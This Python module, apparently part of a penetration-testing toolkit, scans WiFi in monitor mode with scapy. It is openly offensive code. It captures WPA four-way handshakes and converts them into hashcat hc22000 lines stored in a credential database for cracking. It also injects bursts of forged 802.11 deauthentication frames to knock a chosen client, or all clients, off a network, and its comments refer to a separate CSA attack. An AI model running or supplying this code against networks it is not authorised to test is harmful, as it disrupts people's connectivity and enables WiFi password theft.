import os
import re
import shutil
import subprocess
import sys
import threading
import time
from functools import partial

from scapy.all import sniff, sendp, Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap, NoPayload, wrpcap
from scapy.layers.eap import EAPOL, EAPOL_KEY
from scapy.config import conf

from src import info as _info

conf.verb = 0

_PLATFORM = _info.get("platform") or sys.platform
_IS_MACOS = _PLATFORM == "darwin"
_IS_LINUX = _PLATFORM.startswith("linux")

CHANNELS_24 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
CHANNELS_5 = [36, 40, 44, 48, 149, 153, 157, 161, 165]
CHANNELS = CHANNELS_24 + CHANNELS_5

DWELL = 0.6
STALE_AGE = 60.0
HANDSHAKE_HOLD = 3.0
DEAUTH_COUNT = 64
DEAUTH_INTERVAL = 0.005
DEAUTH_RATE = 2
DEAUTH_REASON = 7

DEAUTH_DEFAULTS = {
    "count": DEAUTH_COUNT,      # frames per direction
    "reason": DEAUTH_REASON,    # 802.11 deauth reason code (7 = class 3 frame)
    "interval": DEAUTH_INTERVAL,  # seconds between frames
    "rate": DEAUTH_RATE,        # radiotap Rate (2 = 1 Mbps)
}

_lock = threading.Lock()
_mode_lock = threading.RLock()
_networks = {}
_probes = {}

_beacon_count = 0
_probe_count = 0
_data_count = 0
_other_count = 0

_known_bssids = set()

_handshake_frames = {}
_handshake_state = {}
_handshake_count = 0
_hold_until = {}

_hash_registered = {}

_locked_channel = None

_scanner = None
_last_error = ""

_BROADCAST = "FF:FF:FF:FF:FF:FF"


def _which(name):
    return shutil.which(name) is not None


def _run(cmd, timeout=5):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode == 0, r.stdout, r.stderr
    except (OSError, subprocess.TimeoutExpired):
        return False, "", ""


def _mac(v):
    return str(v).upper() if v else ""


def _to_int(value):
    try:
        return int(value)
    except (TypeError, ValueError):
        return 0


def _is_mgmt(pkt):
    try:
        d = pkt[Dot11]
        return (d.type == 0 and d.subtype in (8, 4)) or d.type == 2
    except Exception:
        return False


def is_macos():
    return _IS_MACOS


def is_linux():
    return _IS_LINUX


def tcpdump_path():
    """Locate the tcpdump binary (used for macOS monitor RX)."""
    for p in (shutil.which("tcpdump"), "/usr/sbin/tcpdump",
              "/usr/bin/tcpdump", "/sbin/tcpdump"):
        if p and os.path.exists(p):
            return p
    return None


def capture_supported():
    """Monitor-mode *receive* (capture) is available.

    Linux: yes. macOS: only if tcpdump exists (it drives monitor mode via the
    Apple80211 ioctl). The built-in Apple Silicon radio supports monitor RX
    (no injection)."""
    if _IS_LINUX:
        return True
    if _IS_MACOS:
        return tcpdump_path() is not None
    return False


def injection_supported():
    """Frame injection / deauth is Linux-only."""
    return _IS_LINUX


def monitor_supported():
    # Kept for backward compatibility: means "capture (monitor RX)".
    return capture_supported()


def _macos_backend():
    from . import wifi_macos
    return wifi_macos


def wifi_interfaces():
    if _IS_MACOS:
        try:
            return _macos_backend().interfaces()
        except Exception:
            return []
    names = []
    if _which("nmcli"):
        ok, out, _ = _run(["nmcli", "-t", "-f", "DEVICE,TYPE,STATE", "device", "status"])
        if ok:
            for line in out.splitlines():
                parts = _split_terse(line)
                if len(parts) >= 2 and parts[1] == "wifi":
                    names.append(parts[0])
    if not names and _which("iw"):
        ok, out, _ = _run(["iw", "dev"])
        if ok:
            for line in out.splitlines():
                m = re.match(r"\s*Interface\s+(\S+)", line)
                if m:
                    names.append(m.group(1))
    # Also expose interfaces already in monitor mode (e.g. left over, or
    # enabled), so the per-interface monitor switch can turn them back off.
    for iface in _monitor_interfaces():
        if iface not in names:
            names.append(iface)
    return names


def wifi_interfaces_state():
    if _IS_MACOS:
        return []
    if not _which("nmcli"):
        return []
    ok, out, _ = _run(["nmcli", "-t", "-f", "DEVICE,TYPE,STATE", "device", "status"])
    if not ok:
        return []
    result = []
    for line in out.splitlines():
        parts = _split_terse(line)
        if len(parts) >= 3 and parts[1] == "wifi":
            result.append((parts[0], parts[2]))
    return result


def _split_terse(line):
    return [p.replace("\\:", ":").replace("\\\\", "\\")
            for p in re.split(r"(?<!\\):", line)]


def _ssid(pkt):
    cur = pkt
    while cur is not None and not isinstance(cur, NoPayload):
        if isinstance(cur, Dot11Elt) and cur.ID == 0:
            info = cur.info
            if isinstance(info, bytes):
                return info.decode(errors="replace")
            return str(info or "")
        cur = cur.payload
    return ""


def _channel(pkt):
    ds = None
    ht = None
    vht = None
    cur = pkt
    while cur is not None and not isinstance(cur, NoPayload):
        if isinstance(cur, Dot11Elt):
            if cur.ID == 3:
                info = getattr(cur, "info", None)
                if info:
                    ds = info[0]
            elif cur.ID == 61:
                info = getattr(cur, "info", None)
                if info:
                    ht = info[0]
            elif cur.ID == 192:
                op = getattr(cur, "VHT_Operation_Info", None)
                if op is not None:
                    vht = op.channel_center0
                else:
                    info = getattr(cur, "info", None)
                    if info and len(info) > 1:
                        vht = info[1]
        cur = cur.payload
    return ds or ht or vht or 0


def _signal(pkt):
    try:
        return pkt[RadioTap].dBm_AntSignal
    except Exception:
        return None


def _rsn_caps(pkt):
    """Return (mfpc, mfpr) from the RSN IE capabilities, or (False, False).

    MFPC (bit 7) = Management Frame Protection capable.
    MFPR (bit 6) = Management Frame Protection required (deauth is protected)."""
    cur = pkt
    while cur is not None and not isinstance(cur, NoPayload):
        if isinstance(cur, Dot11Elt) and cur.ID == 48:
            info = cur.info
            if isinstance(info, bytes) and len(info) >= 8:
                try:
                    pc = int.from_bytes(info[6:8], "little")
                    akm_off = 8 + 4 * pc
                    ac = int.from_bytes(info[akm_off:akm_off + 2], "little")
                    caps_off = akm_off + 2 + 4 * ac
                    if len(info) >= caps_off + 2:
                        caps = int.from_bytes(info[caps_off:caps_off + 2], "little")
                        return bool(caps & 0x80), bool(caps & 0x40)
                except Exception:
                    pass
            return False, False
        cur = cur.payload
    return False, False


def _security(pkt):
    privacy = False
    try:
        privacy = bool(int(pkt[Dot11Beacon].cap) & 0x10)
    except Exception:
        pass

    rsn = False
    wpa1 = False
    has_sae = False
    has_wpa2_akm = False

    cur = pkt
    while cur is not None and not isinstance(cur, NoPayload):
        if isinstance(cur, Dot11Elt):
            if cur.ID == 48:
                rsn = True
                info = cur.info
                if isinstance(info, bytes) and len(info) >= 8:
                    try:
                        pc = int.from_bytes(info[6:8], "little")
                        akm_off = 8 + 4 * pc
                        if len(info) >= akm_off + 2:
                            ac = int.from_bytes(info[akm_off:akm_off + 2], "little")
                            for i in range(ac):
                                off = akm_off + 2 + 4 * i
                                if len(info) >= off + 4:
                                    suite = info[off:off + 4]
                                    if suite[:3] == b"\x00\x0f\xac":
                                        t = suite[3]
                                        if t in (0x08, 0x09):
                                            has_sae = True
                                        elif t in (0x01, 0x02, 0x03, 0x04, 0x05, 0x06):
                                            has_wpa2_akm = True
                    except Exception:
                        pass
            elif cur.ID == 221:
                info = cur.info
                if isinstance(info, bytes) and len(info) >= 4 and info[:4] == b"\x00\x50\xf2\x01":
                    wpa1 = True
        cur = cur.payload

    if not privacy and not rsn and not wpa1:
        return "OPEN"
    if rsn:
        if has_sae and has_wpa2_akm:
            return "WPA2 WPA3"
        if has_sae:
            return "WPA3"
        if wpa1:
            return "WPA1 WPA2"
        return "WPA2"
    if wpa1:
        return "WPA1"
    if privacy:
        return "WEP"
    return "OPEN"


def dbm_to_pct(dbm):
    if dbm is None:
        return 0
    return max(0, min(100, 2 * (dbm + 100)))


def channel_to_freq(ch):
    if ch is None:
        return ""
    if 1 <= ch <= 13:
        return f"{2412 + (ch - 1) * 5} MHz"
    if 36 <= ch <= 64:
        return f"{5180 + (ch - 36) * 5} MHz"
    if 100 <= ch <= 144:
        return f"{5500 + (ch - 100) * 5} MHz"
    if 149 <= ch <= 165:
        return f"{5745 + (ch - 149) * 5} MHz"
    return f"{ch}"


def _process(pkt, device=None):
    global _beacon_count, _probe_count, _data_count, _other_count
    if not pkt.haslayer(Dot11):
        return
    d = pkt[Dot11]
    now = time.time()

    if d.type == 0 and d.subtype == 8:
        _beacon_count += 1
        bssid = _mac(d.addr2) or _mac(d.addr3)
        if not bssid:
            return
        _known_bssids.add(bssid)
        dbm = _signal(pkt)
        mfpc, mfpr = _rsn_caps(pkt)
        pmf = "required" if mfpr else ("capable" if mfpc else "no")
        with _lock:
            n = _networks.get(bssid)
            if n is None:
                n = _networks[bssid] = {
                    "ssid": _ssid(pkt) or "(hidden)",
                    "bssid": bssid,
                    "signal": dbm_to_pct(dbm),
                    "signal_dbm": dbm,
                    "security": _security(pkt),
                    "pmf": pmf,
                    "chan": _channel(pkt),
                    "freq": channel_to_freq(_channel(pkt)),
                    "devices": set(),
                }
            else:
                n["ssid"] = _ssid(pkt) or n.get("ssid", "(hidden)")
                n["signal"] = dbm_to_pct(dbm)
                n["signal_dbm"] = dbm
                n["security"] = _security(pkt)
                n["pmf"] = pmf
                n["chan"] = _channel(pkt)
                n["freq"] = channel_to_freq(_channel(pkt))
            if device:
                n["devices"].add(device)
            n["last_seen"] = now

    elif d.type == 0 and d.subtype == 4:
        _probe_count += 1
        client = _mac(d.addr2)
        if not client:
            return
        ssid = _ssid(pkt)
        ra = _mac(d.addr1)
        with _lock:
            entry = _probes.setdefault(client, {
                "ssids": set(),
                "bssids": set(),
                "signal": None,
                "last_seen": now,
            })
            if ssid:
                entry["ssids"].add(ssid)
            if ra and ra != _BROADCAST:
                entry["bssids"].add(ra)
            entry["last_seen"] = now
            dbm = _signal(pkt)
            if dbm is not None:
                entry["signal"] = dbm

    elif d.type == 2:
        addr1 = _mac(d.addr1)
        addr2 = _mac(d.addr2)
        addr3 = _mac(d.addr3)
        client = None
        bssid = None
        if addr2 in _known_bssids:
            bssid, client = addr2, addr1
        elif addr1 in _known_bssids:
            bssid, client = addr1, addr2
        elif addr3 in _known_bssids:
            bssid = addr3
            client = addr1 if addr2 == addr3 else addr2
        if bssid and client and client != bssid and client != _BROADCAST:
            _data_count += 1
            if _is_eapol_key(pkt):
                _record_handshake(bssid, client, pkt, device)
            with _lock:
                entry = _probes.setdefault(client, {
                    "ssids": set(),
                    "bssids": set(),
                    "signal": None,
                    "last_seen": now,
                })
                entry["bssids"].add(bssid)
                entry["last_seen"] = now
        else:
            _other_count += 1
    else:
        _other_count += 1


def _is_eapol_key(pkt):
    try:
        return pkt.haslayer(EAPOL) and pkt[EAPOL].type == 3
    except Exception:
        return False


def _eapol_msg_number(pkt):
    try:
        return pkt[EAPOL_KEY].guess_key_number()
    except Exception:
        return 0


def _extract_eapol(pkt):
    try:
        key = pkt[EAPOL_KEY]
    except Exception:
        return None
    msg = key.guess_key_number()
    try:
        nonce = bytes(key.key_nonce) if key.key_nonce else b"\x00" * 32
    except Exception:
        nonce = b"\x00" * 32
    try:
        mic = bytes(key.key_mic) if key.key_mic else b"\x00" * 16
    except Exception:
        mic = b"\x00" * 16
    eapol = b""
    eapol_len = 0
    keyver = 0
    try:
        raw_eapol = bytes(pkt[EAPOL])
        if len(raw_eapol) >= 97:
            eapol = raw_eapol[:81] + b"\x00" * 16 + raw_eapol[97:]
            eapol_len = len(raw_eapol)
            keyver = raw_eapol[6] & 7
    except Exception:
        pass
    if not keyver:
        try:
            keyver = int(key.key_descriptor_type_version) & 7
        except Exception:
            keyver = 0
    return {
        "msg": msg,
        "nonce": nonce,
        "mic": mic,
        "keyver": keyver,
        "eapol": eapol,
        "eapol_len": eapol_len,
    }


def _record_handshake(bssid, client, pkt, device):
    global _handshake_count
    fields = _extract_eapol(pkt)
    msg = fields["msg"] if fields else _eapol_msg_number(pkt)
    to_notify = None
    with _lock:
        state = _handshake_state.setdefault(bssid, {}).setdefault(
            client, {"seen": set(), "notified": False,
                     "anonce": None, "snonce": None, "keymic": None,
                     "keyver": 0, "eapol": None, "eapol_len": 0})
        if msg:
            state["seen"].add(msg)
        if fields:
            if msg == 1 and not state.get("anonce"):
                state["anonce"] = fields["nonce"]
            elif msg == 2:
                state["snonce"] = fields["nonce"]
                state["keymic"] = fields["mic"]
                state["keyver"] = fields["keyver"]
                state["eapol"] = fields["eapol"]
                state["eapol_len"] = fields["eapol_len"]
            elif msg == 3 and not state.get("anonce"):
                state["anonce"] = fields["nonce"]
        state["last_seen"] = time.time()
        _handshake_frames.setdefault(bssid, []).append(pkt)
        complete = ((1 in state["seen"] and 2 in state["seen"])
                    or (2 in state["seen"] and 3 in state["seen"]))
        if complete and not state["notified"]:
            state["notified"] = True
            _handshake_count += 1
            ssid = _networks.get(bssid, {}).get("ssid", "")
            to_notify = (bssid, client, ssid)
    if device:
        _hold_until[device] = time.time() + HANDSHAKE_HOLD
    if to_notify:
        bssid, client, ssid = to_notify
        _write_handshake_pcap(bssid)
        _write_handshake_hc22000(bssid, client, ssid)
        _notify_handshake(bssid, client, ssid)


def _write_handshake_pcap(bssid):
    try:
        from src.elwand_paths import handshakes_dir, chown_to_real_user
    except Exception:
        return
    with _lock:
        frames = list(_handshake_frames.get(bssid, []))
        ssid = _networks.get(bssid, {}).get("ssid", "(hidden)")
    if not frames:
        return
    safe = "".join(c if c.isalnum() or c in "._-" else "_" for c in ssid) or "hidden"
    name = f"{safe}_{bssid.replace(':', '')}.pcap"
    path = os.path.join(str(handshakes_dir()), name)
    try:
        wrpcap(path, frames)
        chown_to_real_user(path)
    except Exception as e:
        _emit_error(f"Could not write handshake pcap: {e}")


def _message_pair(seen):
    if 1 in seen and 2 in seen:
        return 128
    if 2 in seen and 3 in seen:
        return 130
    return 128


def _build_hc22000_line(ssid, bssid, client, anonce, keymic, eapol, message_pair):
    mic_hex = (keymic or b"\x00" * 16)[:16].hex()
    mac_ap = bssid.replace(":", "").lower()
    mac_sta = client.replace(":", "").lower()
    essid_hex = (ssid or "").encode("utf-8", errors="replace").hex()
    nonce_ap_hex = (anonce or b"\x00" * 32)[:32].hex()
    eapol_hex = (eapol or b"").hex()
    return (f"WPA*02*{mic_hex}*{mac_ap}*{mac_sta}*{essid_hex}"
            f"*{nonce_ap_hex}*{eapol_hex}*{message_pair:02x}\n")


def _write_handshake_hc22000(bssid, client, ssid):
    try:
        from src.elwand_paths import handshakes_dir, chown_to_real_user
    except Exception:
        return
    with _lock:
        state = _handshake_state.get(bssid, {}).get(client)
        if not state:
            return
        anonce = state.get("anonce")
        keymic = state.get("keymic")
        eapol = state.get("eapol")
        keyver = state.get("keyver", 0)
        seen = set(state.get("seen", set()))
    if not (anonce and keymic and eapol):
        return
    if keyver == 0:
        _emit_error(
            f"WPA handshake for {ssid or '(hidden)'} ({bssid}): key descriptor "
            f"version 0 (WPA3-SAE) — hashcat cannot crack it, skipping .hc22000")
        return
    if keyver == 3:
        _emit_error(
            f"WPA handshake for {ssid or '(hidden)'} ({bssid}) is WPA3 (key "
            f"descriptor version 3); hashcat may reject/fail it on SAE")
    line = _build_hc22000_line(ssid, bssid, client, anonce, keymic, eapol,
                               _message_pair(seen))
    safe = "".join(c if c.isalnum() or c in "._-" else "_" for c in ssid) or "hidden"
    name = f"{safe}_{bssid.replace(':', '')}.hc22000"
    path = os.path.join(str(handshakes_dir()), name)
    try:
        with open(path, "a") as f:
            f.write(line)
        chown_to_real_user(path)
    except Exception as e:
        _emit_error(f"Could not write handshake hc22000: {e}")
        return
    _register_handshake_hash(bssid, line)


def _register_handshake_hash(bssid, line):
    line = (line or "").strip()
    if not line:
        return
    try:
        from src.machines import credential_db
        existing_id = _hash_registered.get(bssid)
        if existing_id:
            # Same BSSID seen again: keep the most recent hash line.
            credential_db.update_hash_value(existing_id, line)
        else:
            hid = credential_db.save_hash_entry(
                "WPA handshake", line, hascat_mode="22000",
                origin="wifi monitor")
            if hid:
                _hash_registered[bssid] = hid
    except Exception:
        pass


def _notify_handshake(bssid, client, ssid):
    try:
        from src import event_bus
        event_bus.submit({
            "type": "handshake",
            "message": f"WPA handshake captured for {ssid or '(hidden)'} ({bssid})",
            "ssid": ssid or "",
            "bssid": bssid,
            "client": client,
        })
    except Exception:
        pass


def flush_handshakes():
    with _lock:
        bssids = list(_handshake_frames)
    for bssid in bssids:
        _write_handshake_pcap(bssid)


def get_stats():
    with _lock:
        return {
            "networks": len(_networks),
            "probes": len(_probes),
            "handshakes": _handshake_count,
            "beacons_seen": _beacon_count,
            "probes_seen": _probe_count,
            "data_seen": _data_count,
            "other_seen": _other_count,
        }


def clear():
    global _beacon_count, _probe_count, _data_count, _other_count, _handshake_count
    with _lock:
        _networks.clear()
        _probes.clear()
        _handshake_frames.clear()
        _handshake_state.clear()
    _known_bssids.clear()
    _hash_registered.clear()
    _beacon_count = 0
    _probe_count = 0
    _data_count = 0
    _other_count = 0
    _handshake_count = 0
    unlock_channel()


def lock_channel(channel):
    global _locked_channel
    _locked_channel = channel


def unlock_channel():
    global _locked_channel
    _locked_channel = None


def is_locked():
    return _locked_channel is not None


def locked_channel():
    return _locked_channel


def get_networks(iface=None):
    now = time.time()
    result = []
    with _lock:
        for bssid, n in _networks.items():
            devices = sorted(n.get("devices") or set())
            if iface and iface not in devices:
                continue
            d = dict(n)
            d.pop("devices", None)
            d["devices"] = devices
            d["device"] = ", ".join(devices)
            d["stale"] = (now - n.get("last_seen", now)) > STALE_AGE
            result.append(d)
    # Keep a stable, discovery order (dict insertion order). Sorting by a
    # fluctuating signal made rows jump around; new networks appear last.
    return result


def _scan_connected():
    if _IS_MACOS:
        return
    now = time.time()
    for iface in wifi_interfaces():
        ok, out, _ = _run(["iw", "dev", iface, "link"])
        if not ok:
            continue
        bssid = ""
        ssid = ""
        freq = ""
        dbm = None
        for line in out.splitlines():
            m = re.match(r"Connected to\s+([0-9A-Fa-f:]{17})", line)
            if m:
                bssid = m.group(1).upper()
            m = re.search(r"SSID:\s*(.+)", line)
            if m:
                ssid = m.group(1).strip()
            m = re.search(r"freq:\s*([\d.]+)", line)
            if m:
                freq = m.group(1)
            m = re.search(r"signal:\s*(-?\d+)", line)
            if m:
                dbm = int(m.group(1))
        if not bssid:
            continue
        with _lock:
            n = _networks.get(bssid)
            if n is None:
                n = _networks[bssid] = {
                    "ssid": ssid or "(hidden)",
                    "bssid": bssid,
                    "signal": dbm_to_pct(dbm),
                    "signal_dbm": dbm,
                    "security": "OPEN",
                    "chan": 0,
                    "freq": f"{freq} MHz" if freq else "",
                    "devices": set(),
                }
            else:
                if ssid and n.get("ssid") == "(hidden)":
                    n["ssid"] = ssid
                if dbm is not None:
                    n["signal"] = max(n.get("signal", 0), dbm_to_pct(dbm))
                    n["signal_dbm"] = dbm
                if freq:
                    n["freq"] = f"{freq} MHz"
            n["devices"].add(iface)
            n["last_seen"] = now


def get_probes():
    now = time.time()
    result = []
    with _lock:
        for mac, e in _probes.items():
            result.append(_probe_dict(mac, e, now))
    result.sort(key=lambda x: x["last_seen"], reverse=True)
    return result


def probes_for(ssid=None, bssid=None):
    now = time.time()
    result = []
    with _lock:
        for mac, e in _probes.items():
            if ssid and ssid in e["ssids"]:
                result.append(_probe_dict(mac, e, now))
                continue
            if bssid and bssid.upper() in e["bssids"]:
                result.append(_probe_dict(mac, e, now))
    return result


def _probe_dict(mac, e, now=None):
    if now is None:
        now = time.time()
    return {
        "mac": mac,
        "ssids": sorted(e["ssids"]),
        "bssids": sorted(e["bssids"]),
        "signal": e["signal"],
        "last_seen": e["last_seen"],
        "stale": (now - e["last_seen"]) > STALE_AGE,
    }


def _scan_nmcli(iface=None):
    cmd = ["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL,SECURITY,CHAN,FREQ,DEVICE",
           "device", "wifi", "list"]
    if iface:
        cmd += ["ifname", iface]
    ok, out, _ = _run(cmd, timeout=10)
    if not ok:
        return []
    nets = []
    for line in out.splitlines():
        line = line.strip()
        if not line:
            continue
        parts = _split_terse(line)
        if len(parts) < 7:
            continue
        ssid, bssid, signal, security, chan, freq, device = parts[:7]
        nets.append({
            "ssid": ssid or "(hidden)",
            "bssid": bssid or "",
            "signal": _to_int(signal),
            "signal_dbm": None,
            "security": security or "OPEN",
            "chan": _to_int(chan),
            "freq": freq or "",
            "device": device or "",
            "devices": [device] if device else [],
            "stale": False,
            "last_seen": time.time(),
        })
    return nets


def scan_networks(iface=None):
    if _IS_MACOS:
        try:
            return _macos_backend().scan(iface)
        except Exception as e:
            _emit_error(f"WiFi scan error: {e}")
            return []
    return _scan_nmcli(iface)


def scan_networks_fallback(iface=None):
    nets = scan_networks(iface)
    seen = set()
    result = []
    for n in nets:
        key = n["bssid"] or n["ssid"]
        if key in seen:
            continue
        seen.add(key)
        result.append(n)
    result.sort(key=lambda x: -x["signal"])
    return result


def _iface_type(iface):
    if _IS_MACOS:
        return ""
    ok, out, _ = _run(["iw", "dev", iface, "info"])
    if not ok:
        return ""
    for line in out.splitlines():
        m = re.match(r"\s*type\s+(\S+)", line)
        if m:
            return m.group(1)
    return ""


def _enter_monitor(iface):
    if _IS_MACOS:
        return False
    with _mode_lock:
        _run(["nmcli", "device", "set", iface, "managed", "no"])
        _run(["ip", "link", "set", iface, "down"])
        ok, _, err = _run(["iw", "dev", iface, "set", "type", "monitor"])
        _run(["ip", "link", "set", iface, "up"])
        time.sleep(0.4)
        if not ok:
            if _iface_type(iface) == "monitor":
                return True
            reason = err.strip() or "unknown error"
            _emit_error(
                f"Could not set {iface} to monitor mode: {reason}. "
                "WiFi monitor requires root (CAP_NET_ADMIN/CAP_NET_RAW). "
                "Falling back to system network scan (no client probes).")
            _exit_monitor(iface)
            return False
        return True


def _exit_monitor(iface):
    if _IS_MACOS:
        return
    with _mode_lock:
        _run(["ip", "link", "set", iface, "down"])
        for _ in range(3):
            ok, _, _ = _run(["iw", "dev", iface, "set", "type", "managed"])
            if ok:
                break
            time.sleep(0.3)
        _run(["ip", "link", "set", iface, "up"])
        _run(["nmcli", "device", "set", iface, "managed", "yes"])


def _set_channel(iface, channel):
    if _IS_MACOS:
        return
    if channel:
        _run(["iw", "dev", iface, "set", "channel", str(channel)])


def _current_channel(iface):
    if _IS_MACOS:
        return 0
    ok, out, _ = _run(["iw", "dev", iface, "info"])
    if not ok:
        return 0
    for line in out.splitlines():
        m = re.match(r"\s*channel\s+(\d+)", line)
        if m:
            return int(m.group(1))
    return 0


def monitor_ifaces():
    svc = _scanner
    return list(svc.ifaces) if svc else []


def reserve_iface(iface):
    """Reserve one monitor interface for external use (CSA attack)."""
    get_service().reserve(iface)


def release_iface(iface):
    """Release an interface reserved with reserve_iface()."""
    get_service().release(iface)


def wait_iface_released(iface, timeout=6.0):
    """Block until the monitor worker has put iface back to managed mode."""
    end = time.time() + timeout
    while time.time() < end:
        if _iface_type(iface) != "monitor":
            return True
        time.sleep(0.1)
    return _iface_type(iface) != "monitor"


def _send_deauth(iface, addr1, addr2, addr3, count, reason,
                 interval=DEAUTH_INTERVAL, rate=DEAUTH_RATE):
    # aircrack-ng style: prepend a 12-byte radiotap with RATE + TXFLAGS
    # (NOACK|NOSEQ). An empty radiotap is rejected on some drivers.
    frame = (
        RadioTap(present="Rate+TXFlags", Rate=rate, TXFlags=0x0018)
        / Dot11(type=0, subtype=12, addr1=addr1, addr2=addr2, addr3=addr3)
        / Dot11Deauth(reason=reason)
    )
    sendp(frame, iface=iface, count=count, inter=interval, verbose=0)
    return count


def deauth(bssid, client=None, iface=None, count=DEAUTH_COUNT,
           reason=DEAUTH_REASON, interval=DEAUTH_INTERVAL, rate=DEAUTH_RATE):
    """Send a burst of deauthentication frames from an AP to a client.

    Linux only. Works whether or not the monitor service is running: if the
    target interface is not already in monitor mode it is put there for the
    burst and restored afterwards, so it is NOT sniffing while injecting.
    Returns (ok, message)."""
    if not injection_supported():
        return False, "Deauth is not supported on this platform (scan-only)."
    bssid = _mac(bssid)
    if not bssid:
        return False, "No target network selected."
    with _lock:
        net = _networks.get(bssid)
        chan = (net or {}).get("chan") or 0
    if not net:
        return False, f"Network {bssid} is no longer in the scan list."
    if not chan:
        return False, f"Unknown channel for {bssid}; cannot deauth."

    ifaces = wifi_interfaces()
    if not ifaces:
        return False, "No WiFi interface available."
    if iface not in ifaces:
        iface = ifaces[0]

    dst = _mac(client) if client else _BROADCAST
    if dst in ("", _BROADCAST):
        dst = _BROADCAST

    entered = False
    if _iface_type(iface) != "monitor":
        if not _enter_monitor(iface):
            return False, f"Could not put {iface} in monitor mode."
        entered = True

    sent = 0
    try:
        _set_channel(iface, chan)
        time.sleep(0.15)
        sent += _send_deauth(iface, dst, bssid, bssid, count, reason,
                             interval, rate)
        if dst != _BROADCAST:
            sent += _send_deauth(iface, bssid, dst, bssid, count, reason,
                                 interval, rate)
    except Exception as e:
        return False, f"Deauth failed: {e}"
    finally:
        if entered:
            _exit_monitor(iface)

    target = "all clients (broadcast)" if dst == _BROADCAST else dst
    return True, (f"Sent {sent} deauth frames to {target} [{bssid}] "
                  f"channel {chan} on {iface}.")


class WifiMonitorService:
    def __init__(self):
        self._thread = None
        self._running = False
        self._ifaces = []
        self._workers = {}
        self._excluded = set()
        self._enabled = set()
        self._lock = threading.Lock()

    def start(self, iface=None):
        if self._running:
            return True
        self._running = True
        self._thread = threading.Thread(target=self._manager, daemon=True)
        self._thread.start()
        return True

    def stop(self):
        self._running = False

    @property
    def is_running(self):
        return self._running

    @property
    def iface(self):
        return ", ".join(self._ifaces) if self._ifaces else ""

    @property
    def ifaces(self):
        return list(self._ifaces)

    def enable(self, iface):
        """User wants monitor mode on this interface."""
        with self._lock:
            self._enabled.add(iface)
        self.start()

    def disable(self, iface):
        """User turned monitor mode off for this interface."""
        with self._lock:
            self._enabled.discard(iface)
            self._excluded.discard(iface)
            w = self._workers.pop(iface, None)
            self._ifaces = sorted(self._workers)
        if w:
            w["stop"].set()

    def is_enabled(self, iface):
        with self._lock:
            return iface in self._enabled

    def enabled_ifaces(self):
        with self._lock:
            return sorted(self._enabled)

    def active_ifaces(self):
        with self._lock:
            return sorted(self._workers)

    def reserve(self, iface):
        """Stop monitoring on a single interface and keep it free for
        external use (e.g. the CSA pulse attack). Other interfaces keep
        working untouched."""
        with self._lock:
            self._excluded.add(iface)
            w = self._workers.pop(iface, None)
            self._ifaces = sorted(self._workers)
        if w:
            w["stop"].set()

    def release(self, iface):
        """Undo reserve(): allow the monitor to use the interface again."""
        with self._lock:
            self._excluded.discard(iface)

    def _manager(self):
        while self._running:
            if _IS_MACOS:
                free = [n for n in wifi_interfaces()
                        if n not in self._excluded]
            else:
                free = [n for n, s in wifi_interfaces_state()
                        if s != "connected" and n not in self._excluded]
            with self._lock:
                want = [i for i in free if i in self._enabled]
                for iface in list(self._workers):
                    if iface not in want:
                        self._workers[iface]["stop"].set()
                        del self._workers[iface]
                for iface in want:
                    if iface not in self._workers:
                        stop_event = threading.Event()
                        self._workers[iface] = {"stop": stop_event}
                        threading.Thread(
                            target=self._worker,
                            args=(iface, stop_event),
                            daemon=True,
                        ).start()
                self._ifaces = sorted(self._workers)
            if self._running:
                _scan_connected()
            time.sleep(5)

    def _worker(self, iface, stop_event):
        if _IS_MACOS:
            try:
                from . import wifi_macos
                wifi_macos.capture_loop(iface, stop_event)
            except Exception as e:
                _emit_error(f"WiFi capture error: {e}")
            return
        if not _enter_monitor(iface):
            return
        try:
            self._hop_loop(iface, stop_event)
        finally:
            _exit_monitor(iface)

    def _hop_loop(self, iface, stop_event):
        last_err = 0.0
        process = partial(_process, device=iface)
        locked_set = None
        while self._running and not stop_event.is_set():
            locked = _locked_channel
            if locked:
                if locked_set != locked:
                    _set_channel(iface, locked)
                    locked_set = locked
                last_err = self._sniff_dwell(iface, process, last_err)
            else:
                locked_set = None
                for ch in CHANNELS:
                    if stop_event.is_set() or not self._running:
                        break
                    if _locked_channel is not None:
                        break
                    _set_channel(iface, ch)
                    last_err = self._sniff_dwell(iface, process, last_err)
                    while (self._running and not stop_event.is_set()
                           and _hold_until.get(iface, 0) > time.time()):
                        last_err = self._sniff_dwell(iface, process, last_err)

    def _sniff_dwell(self, iface, process, last_err):
        try:
            sniff(iface=iface, prn=process, lfilter=_is_mgmt,
                  timeout=DWELL, store=0)
        except OSError as e:
            now = time.time()
            if now - last_err > 5:
                _emit_error(f"WiFi monitor error: {e}")
                last_err = now
            time.sleep(0.3)
        except Exception as e:
            now = time.time()
            if now - last_err > 5:
                _emit_error(f"WiFi monitor transient error: {e}")
                last_err = now
            time.sleep(0.3)
        return last_err


def _emit_error(msg):
    global _last_error
    _last_error = msg
    try:
        from src import event_bus
        event_bus.submit({"type": "scan_error", "message": msg})
    except Exception:
        pass


def _emit_info(msg):
    try:
        from src import event_bus
        event_bus.submit({"type": "scan_info", "message": msg})
    except Exception:
        pass


def get_service():
    global _scanner
    if _scanner is None:
        _scanner = WifiMonitorService()
    return _scanner


def start_monitor(iface=None):
    return get_service().start(iface)


def enable_iface(iface):
    """Turn monitor mode ON for a single interface (user action)."""
    get_service().enable(iface)


def disable_iface(iface):
    """Turn monitor mode OFF for a single interface."""
    get_service().disable(iface)


def is_iface_enabled(iface):
    return _scanner is not None and _scanner.is_enabled(iface)


def enabled_ifaces():
    return _scanner.enabled_ifaces() if _scanner else []


def active_ifaces():
    return _scanner.active_ifaces() if _scanner else []


def stop_monitor():
    if _scanner is not None:
        _scanner.stop()


def is_running():
    # True when at least one interface is actively capturing.
    return bool(_scanner is not None and _scanner.active_ifaces())


def last_error():
    return _last_error


def _monitor_interfaces():
    if _IS_MACOS:
        return []
    ok, out, _ = _run(["iw", "dev"])
    if not ok:
        return []
    result = []
    current = None
    for line in out.splitlines():
        m = re.match(r"\s*Interface\s+(\S+)", line)
        if m:
            current = m.group(1)
            continue
        if current is not None and "type monitor" in line:
            result.append(current)
            current = None
    return result


def recover_monitor_interfaces():
    for iface in _monitor_interfaces():
        _exit_monitor(iface)


def shutdown():
    if _scanner is not None:
        _scanner.stop()
    flush_handshakes()
